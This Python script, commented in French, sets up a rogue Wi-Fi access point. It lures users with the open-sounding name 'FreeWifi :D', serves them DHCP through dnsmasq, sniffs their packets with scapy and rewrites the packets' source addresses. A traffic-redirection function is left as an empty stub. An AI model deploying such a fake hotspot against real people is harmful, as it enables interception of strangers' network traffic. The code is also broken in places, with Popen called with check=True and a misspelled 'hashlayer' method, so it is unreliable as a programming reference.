import subprocess
import sys
import argparse
from scapy.all import *

def create_access_point(interface):
    print(f"Création d'un point d'acces wifi sur l'interface {interface}")
    ssid = "FreeWifi :D"
    password = "SajedCalvitie1"
    channel = 6
    
    # Configuration de l'interface
    hostapd_config = f"""
interface={interface}
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    
    with open("/tmp/hostapd.conf", "w") as config_file:
        config_file.write(hostapd_config)
        
    dnsmask_config = f"""
interface={interface}
dhcp-range=192.168.150.10,192.168.150.50,255.255.255.0,12h
"""
    
    with open("/tmp/dnsmasq.conf", "w") as config_file:
        config_file.write(dnsmask_config)
        
    # Démarrage des services
    try:
        subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd.conf"], check=True)
        print(f"Point d'acces wifi {ssid} démarré avec succès sur l'interface {interface}")
        
        subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], check=True)
        print("Serveur DHCP démarré avec succès") 
        
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors du démarrage du point d'acces: {e}")
        
    

def capture_packets(interface):
    print(f"Capture de paquets sur l'interface {interface}")
    packets = sniff(iface=interface, count=10)
    print(f"Capture de {len(packets)} paquets")
    return packets
    

def modify_packets(packets):
    print(f"Modification de {len(packets)} paquets")
    for packet in packets:
        
        if packet.hashlayer(IP):
            print(f"packet avant modification: {packet.summary()}")
            packet[IP].src = "192.168.1.100"
            print(f"packet après modification: {packet.summary()}")
    return packets
            


def redirect_requests():
    print("Redirection des requêtes vers internet")


        
def main():
    # Si il n'y a pas d'arguments:
    if len(sys.argv) < 2:
        print("Usage: python3 main.py -i <interface> [-c] [-cp] [-r]")
        sys.exit(1)
        
    # Si il y a des arguments:
    parser = argparse.ArgumentParser(description="Script permettant de créer un RogueAP et capturer les paquets")
    parser.add_argument("-i", "--interface", required=True, help="Interface réseau")
    parser.add_argument("-c", "--create", action="store_true", help="Créer un point d'acces wifi")
    parser.add_argument("-cp", "--capture", action="store_true", help="Capturer et modifier les paquets")
    parser.add_argument("-r", "--redirect", action="store_true", help="Rediriger les requêtes vers internet")
    args = parser.parse_args()
    
    if args.create:
        create_access_point(args.interface)
    
    if args.capture:
        packets = capture_packets(args.interface)
        modify_packets(packets)
    
    if args.redirect:
        redirect_requests()
        
        
if __name__ == "__main__":
    main()
        
    